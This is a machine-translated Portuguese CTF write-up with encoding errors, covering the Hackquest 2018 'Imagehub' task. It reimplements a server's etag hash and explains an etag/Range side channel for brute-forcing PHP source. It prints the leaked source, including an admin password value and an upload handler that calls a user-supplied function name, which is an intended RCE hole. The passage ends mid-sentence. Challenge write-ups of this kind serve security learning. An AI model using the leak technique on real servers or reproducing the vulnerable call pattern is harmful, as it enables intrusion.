<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üíå üèÜ üßëüèø‚Äçü§ù‚ÄçüßëüèΩ Hackquest 2018. Resultados e revis√µes. Dia 4-7 üë©üèΩ‚Äçü§ù‚Äçüë®üèæ üòô üßë‚Äçü§ù‚Äçüßë</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Como prometido, estamos postando a segunda parte das decis√µes anuais sobre o hackquest. Dia 4-7: a tens√£o aumenta e as tarefas s√£o mais interessantes!...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Hackquest 2018. Resultados e revis√µes. Dia 4-7</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/440312/">  Como prometido, estamos postando a segunda parte das decis√µes anuais sobre o hackquest.  Dia 4-7: a tens√£o aumenta e as tarefas s√£o mais interessantes! <br><img src="https://habrastorage.org/webt/oa/br/8l/oabr8lkxzurvxgw-20o0jq23hgo.jpeg"><br><a name="habracut"></a><br><h2>  Conte√∫do: </h2><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Dia4.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Imagehub</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Dia5.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Tempo</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Dia6.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Awesome vm</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Dia7.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Hiddenresource</a> </li></ul><br><img src="https://habrastorage.org/webt/xv/67/n9/xv67n9j_kw2fxrljp9zrrqewzxk.jpeg"><br><h2><a name="Imagehub"></a>  Dia4.  Imagehub </h2><br>  Esta tarefa foi preparada pelo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">SPbCTF</a> . <br><br>  <i>Nossa nova cria√ß√£o matar√° o Instagram.</i>  <i>N√≥s o convenceremos em apenas duas palavras:</i> <i><br><br></i>  <i>1. Filtros.</i>  <i>Novos filtros nunca vistos antes para suas fotos enviadas.</i> <i><br></i>  <i>2. Armazenamento em cache.</i>  <i>O servidor HTTP personalizado garante que os arquivos de imagem cheguem ao cache do navegador.</i> <i><br><br></i>  <i>Experimente agora mesmo!</i>  <i>imagehub.spb.ctf.su</i> <i><br><br></i>  <i>Execute / get_the_flag para ganhar.</i> <i><br></i>  <i>Bin√°rio do servidor personalizado: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">dppth</a></i> <br><br>  <b>Dicas</b> <br>  <i><b>25/10/2018 20:00</b></i> <i><br></i>  <i>Tarefa n√£o foi resolvida.</i>  <i>24 horas adicionadas.</i> <i><br><br></i>  <i><b>25/10/2018 17:00</b></i> <i><br></i>  <i>Existem dois erros que conhecemos.</i>  <i>Primeiro, voc√™ obt√©m as fontes do aplicativo Web, e o segundo, o RCE.</i> <br><br><h4>  Vis√£o geral: </h4><br>  Execut√°vel: <br><br><ul><li>  ELF x86_64 </li><li>  Implementa um servidor http simples </li><li>  Se o arquivo solicitado tiver um bit execut√°vel, ele ser√° passado para php-fpm </li><li>  C√≥digo implementa cache de etag customizado </li></ul><br>  Web part: <br><br><ul><li>  Possui a funcionalidade de upload de arquivos.  A imagem pode ser modificada usando filtros predefinidos. </li><li>  P√°gina de administrador com B√°sico em /? Admin = show </li></ul><br><h4>  Vulnerabilidade: leitura do c√≥digo fonte </h4><br>  A funcionalidade de cache parece interessante, porque podemos obter um intervalo arbitr√°rio de arquivos do servidor (at√© um intervalo de 1 byte). <br><br> <code>Etag = sprintf("%08x%08x%08x", file_mtime, hash, file_size);</code> <br> <div class="spoiler">  <b class="spoiler_title">Hash_function:</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">etag_hash</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(data)</span></span></span><span class="hljs-function">:</span></span> v16 = [<span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> _ <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">16</span></span>)] v16[<span class="hljs-number"><span class="hljs-number">0</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span> v16[<span class="hljs-number"><span class="hljs-number">1</span></span>] = <span class="hljs-number"><span class="hljs-number">0x1DB71064</span></span> v16[<span class="hljs-number"><span class="hljs-number">2</span></span>] = <span class="hljs-number"><span class="hljs-number">0x3B6E20C8</span></span> v16[<span class="hljs-number"><span class="hljs-number">3</span></span>] = <span class="hljs-number"><span class="hljs-number">0x26D930AC</span></span> v16[<span class="hljs-number"><span class="hljs-number">4</span></span>] = <span class="hljs-number"><span class="hljs-number">0x76DC4190</span></span> v16[<span class="hljs-number"><span class="hljs-number">5</span></span>] = <span class="hljs-number"><span class="hljs-number">0x6B6B51F4</span></span> v16[<span class="hljs-number"><span class="hljs-number">6</span></span>] = <span class="hljs-number"><span class="hljs-number">0x4DB26158</span></span> v16[<span class="hljs-number"><span class="hljs-number">7</span></span>] = <span class="hljs-number"><span class="hljs-number">0x5005713C</span></span> v16[<span class="hljs-number"><span class="hljs-number">8</span></span>] = <span class="hljs-number"><span class="hljs-number">0xEDB88320</span></span> v16[<span class="hljs-number"><span class="hljs-number">9</span></span>] = <span class="hljs-number"><span class="hljs-number">0xF00F9344</span></span> v16[<span class="hljs-number"><span class="hljs-number">10</span></span>] = <span class="hljs-number"><span class="hljs-number">0xD6D6A3E8</span></span> v16[<span class="hljs-number"><span class="hljs-number">11</span></span>] = <span class="hljs-number"><span class="hljs-number">0xCB61B38C</span></span> v16[<span class="hljs-number"><span class="hljs-number">12</span></span>] = <span class="hljs-number"><span class="hljs-number">0x9B64C2B0</span></span> v16[<span class="hljs-number"><span class="hljs-number">13</span></span>] = <span class="hljs-number"><span class="hljs-number">0x86D3D2D4</span></span> v16[<span class="hljs-number"><span class="hljs-number">14</span></span>] = <span class="hljs-number"><span class="hljs-number">0xA00AE278</span></span> v16[<span class="hljs-number"><span class="hljs-number">15</span></span>] = <span class="hljs-number"><span class="hljs-number">0xBDBDF21C</span></span> hash = <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(len(data)): v5 = ((hash &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) ^ v16[(hash ^ data[i]) &amp; <span class="hljs-number"><span class="hljs-number">0xF</span></span>]) &amp; <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span> hash = ((v5 &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) ^ v16[v5 &amp; <span class="hljs-number"><span class="hljs-number">0xF</span></span> ^ (data[i] &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>)]) &amp; <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (~hash) &amp; <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span></code> </pre> <br></div></div><br>  Infelizmente, o etag √© removido para arquivos execut√°veis ‚Äã‚Äã(* .php): <br><br><pre> <code class="plaintext hljs">stat_0(v2, &amp;stat_buf); if ( stat_buf.st_mode &amp; S_IEXEC ) { setHeader(a2-&gt;respo, "cache-control", "no-store"); deleteHeade(a2-&gt;respo, "etag"); set_environment_info(a1); dup2(fd, 0); snprintf(s, 4096, "/usr/bin/php-cgi %s", a1-&gt;url);</code> </pre> <br>  Ainda existe uma verifica√ß√£o antes da execu√ß√£o da p√°gina; portanto, se adivinharmos corretamente o valor etag ( <b>se n√£o houver nenhuma correspond√™ncia</b> ), o servidor nos fornecer√° uma resposta de status <b>304 Not Modified</b> .  Usando isso, podemos criar for√ßa de c√≥digo fonte byte a byte. <br><br><pre> <code class="plaintext hljs">v11 = getHeader(&amp;s.request, "if-modified-since"); if ( v11 ) { v3 = getHeader(&amp;v14, "last-modified"); if ( !strcmp(v11, v3) ) send_status(304); } v12 = getHeader(&amp;s.request, "if-none-match"); if ( v12 ) { v4 = getHeader(&amp;v14, "etag"); if ( !strcmp(v12, v4) ) send_status(304); } exec_and_prepare_response_body(&amp;s, &amp;a2a);</code> </pre> <br>  Vamos resumir o que temos do RE: <br><br><ol><li>  O registro de data e hora √© facilmente lido no cabe√ßalho da resposta da √∫ltima modifica√ß√£o (string -&gt; registro de data e hora). </li><li>  O intervalo permite ter um comprimento de byte (portanto, obteremos hash para apenas um byte) </li><li>  O hash pode ser calculado para um intervalo de 1 byte (256 valores poss√≠veis) </li><li>  O tamanho √© brutal, mas precisamos saber pelo menos um byte do arquivo de destino. </li><li>  Como gostar√≠amos de obter c√≥digo fonte para arquivos * .php, √© uma boa suposi√ß√£o que o arquivo esteja come√ßando com "&lt;? Php". </li></ol><br>  O primeiro passo ser√° obter o tamanho e o segundo, obter o conte√∫do real do arquivo. <br>  Com o c√≥digo multiencadeado, cheguei √† velocidade de ~ 1 char / s e joguei alguns arquivos <br><div class="spoiler">  <b class="spoiler_title">index.php</b> <div class="spoiler_text"><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-comment"><span class="hljs-comment">// error_reporting(0); if (isset($_GET["admin"]) &amp;&amp; (!isset($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_PW'] !== '888b2f04eef9a49fc87fa81089b736de')) { header('WWW-Authenticate: Basic realm="Admin Area"'); header('HTTP/1.0 401 Unauthorized'); } require "upload.php"; $uploader = new ImageUploader(); $result = $uploader-&gt;upload(); if ($result === true) die(); if ($result &gt; 0) { echo "Error: " . $result; } if ($uploader-&gt;upload() !== true) { include "templates/main.php"; }</span></span></code> </pre> <br></div></div><br><div class="spoiler">  <b class="spoiler_title">upload.php</b> <div class="spoiler_text"><pre> <code class="php hljs"> <span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">"includes/uploaderror.php"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">"includes/verify.php"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">"includes/filters.php"</span></span>; <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">ImageUploader</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> TARGET_DIR = <span class="hljs-string"><span class="hljs-string">"51a8ae2cab09c6b728919fe09af57ded/"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">upload</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ $result = verify_parameters(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($result !== <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $result; } $target_file = ImageUploader::TARGET_DIR . basename($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"name"</span></span>]); $size = intval($_POST[<span class="hljs-string"><span class="hljs-string">'size'</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!move_uploaded_file($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"tmp_name"</span></span>], $target_file)) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::MOVE_ERROR; } $text = $_POST[<span class="hljs-string"><span class="hljs-string">'text'</span></span>]; $filterImage = $_POST[<span class="hljs-string"><span class="hljs-string">'filter'</span></span>]($size, $text); $imagick = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> \Imagick(realpath($target_file)); $imagick-&gt;scaleimage($size, $size); $imagick-&gt;setImageOpacity(<span class="hljs-number"><span class="hljs-number">0.5</span></span>); $imagick-&gt;compositeImage($filterImage, imagick::CHANNEL_ALPHA, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>); header(<span class="hljs-string"><span class="hljs-string">"Content-Type: image/jpeg"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> $imagick-&gt;getImageBlob(); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; } }</code> </pre> </div></div><br><div class="spoiler">  <b class="spoiler_title">inclui / filters.php</b> <div class="spoiler_text"><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">make_text</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($image, $size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $draw = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickDraw(); $draw-&gt;setFillColor(<span class="hljs-string"><span class="hljs-string">'white'</span></span>); $draw-&gt;setFontSize( <span class="hljs-number"><span class="hljs-number">18</span></span> ); $image-&gt;annotateImage($draw, $size / <span class="hljs-number"><span class="hljs-number">2</span></span> - <span class="hljs-number"><span class="hljs-number">65</span></span>, $size - <span class="hljs-number"><span class="hljs-number">20</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, $text); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">futut</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">'rgba(127,127,127,127)'</span></span> ); $image-&gt;newImage($size, $size, $pixel); $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">incasinato</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">'rgba(130,100,255,3)'</span></span> ); $image-&gt;newImage($size, $size, $pixel); $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">fertocht</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $s = $size % <span class="hljs-number"><span class="hljs-number">255</span></span>; $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">"rgba($s,$s,$s,127)"</span></span> ); $image-&gt;newImage($size, $size, $pixel); $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">jebeno</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">'rgba(0,255,255,255)'</span></span> ); $image-&gt;newImage($size, $size, $pixel); $iterator = $image-&gt;getPixelIterator(); $i = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ($iterator <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $row=&gt;$pixels) { $i++; $j=<span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ( $pixels <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $col=&gt;$pixel ) { $j++; $color = $pixel-&gt;getColor(); $alpha = $pixel-&gt;getColor(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); $r = ($color[<span class="hljs-string"><span class="hljs-string">'r'</span></span>]+$i*<span class="hljs-number"><span class="hljs-number">10</span></span>) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $g = ($color[<span class="hljs-string"><span class="hljs-string">'g'</span></span>]-$j) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $b = ($color[<span class="hljs-string"><span class="hljs-string">'b'</span></span>]-($size-$j)) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $a = ($alpha[<span class="hljs-string"><span class="hljs-string">'a'</span></span>]) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $pixel-&gt;setColor(<span class="hljs-string"><span class="hljs-string">"rgba($r,$g,$b,$a)"</span></span>); } $iterator-&gt;syncIterator(); } $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">kuthamanga</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">'rgba(127,127,127,127)'</span></span> ); $image-&gt;newImage($size, $size, $pixel); $iterator = $image-&gt;getPixelIterator(); $i = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ($iterator <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $row=&gt;$pixels) { $i++; $j=<span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ( $pixels <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $col=&gt;$pixel ) { $j++; $color = $pixel-&gt;getColor(); $alpha = $pixel-&gt;getColor(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); $r = ($color[<span class="hljs-string"><span class="hljs-string">'r'</span></span>]+$i) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $g = ($color[<span class="hljs-string"><span class="hljs-string">'g'</span></span>]-$j) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $b = ($color[<span class="hljs-string"><span class="hljs-string">'b'</span></span>]-$i) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $a = ($alpha[<span class="hljs-string"><span class="hljs-string">'a'</span></span>]+$j) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $pixel-&gt;setColor(<span class="hljs-string"><span class="hljs-string">"rgba($r,$g,$b,$a)"</span></span>); } $iterator-&gt;syncIterator(); } $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; }</code> </pre> <br></div></div><br><div class="spoiler">  <b class="spoiler_title">inclui / uploaderror.php</b> <div class="spoiler_text"><pre> <code class="php hljs"> <span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">UploadError</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> POST_SUBMIT = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> IMAGE_NOT_FOUND = <span class="hljs-number"><span class="hljs-number">1</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> NOT_IMAGE = <span class="hljs-number"><span class="hljs-number">2</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> FILE_EXISTS = <span class="hljs-number"><span class="hljs-number">3</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> BIG_SIZE = <span class="hljs-number"><span class="hljs-number">4</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> INCORRECT_EXTENSION = <span class="hljs-number"><span class="hljs-number">5</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> INCORRECT_MIMETYPE = <span class="hljs-number"><span class="hljs-number">6</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> INVALID_PARAMS = <span class="hljs-number"><span class="hljs-number">7</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> INCORRECT_SIZE = <span class="hljs-number"><span class="hljs-number">8</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> MOVE_ERROR = <span class="hljs-number"><span class="hljs-number">9</span></span>; }</code> </pre> <br></div></div><br><div class="spoiler">  <b class="spoiler_title">inclui / verifique.php</b> <div class="spoiler_text"><pre> <code class="php hljs"> <span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">verify_parameters</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST[<span class="hljs-string"><span class="hljs-string">'submit'</span></span>])) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::POST_SUBMIT; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_FILES[<span class="hljs-string"><span class="hljs-string">'imageFile'</span></span>])) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::IMAGE_NOT_FOUND; } $target_file = ImageUploader::TARGET_DIR . basename($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"name"</span></span>]); $imageFileType = strtolower(pathinfo($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"name"</span></span>], PATHINFO_EXTENSION)); $imageFileInfo = getimagesize($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"tmp_name"</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($imageFileInfo === <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::NOT_IMAGE; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"size"</span></span>] &gt; <span class="hljs-number"><span class="hljs-number">1024</span></span>*<span class="hljs-number"><span class="hljs-number">32</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::BIG_SIZE; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!in_array($imageFileType, [<span class="hljs-string"><span class="hljs-string">'jpg'</span></span>])) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::INCORRECT_EXTENSION; } $imageMimeType = $imageFileInfo[<span class="hljs-string"><span class="hljs-string">'mime'</span></span>]; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($imageMimeType !== <span class="hljs-string"><span class="hljs-string">'image/jpeg'</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::INCORRECT_MIMETYPE; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (file_exists($target_file)) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::FILE_EXISTS; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST[<span class="hljs-string"><span class="hljs-string">'filter'</span></span>]) || !<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST[<span class="hljs-string"><span class="hljs-string">'size'</span></span>]) || !<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST[<span class="hljs-string"><span class="hljs-string">'text'</span></span>])) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::INVALID_PARAMS; } $size = intval($_POST[<span class="hljs-string"><span class="hljs-string">'size'</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (($size &lt;= <span class="hljs-number"><span class="hljs-number">0</span></span>) || ($size &gt; <span class="hljs-number"><span class="hljs-number">512</span></span>)) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::INCORRECT_SIZE; } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; }</code> </pre> <br></div></div><br>  Isso nos d√°: <br><ul><li>  Nome de usu√°rio / senha para Admin Basic.  Completamente in√∫til, ele apenas imprime a string: <br>  <i>Congratz.</i>  <i>Agora voc√™ pode ler 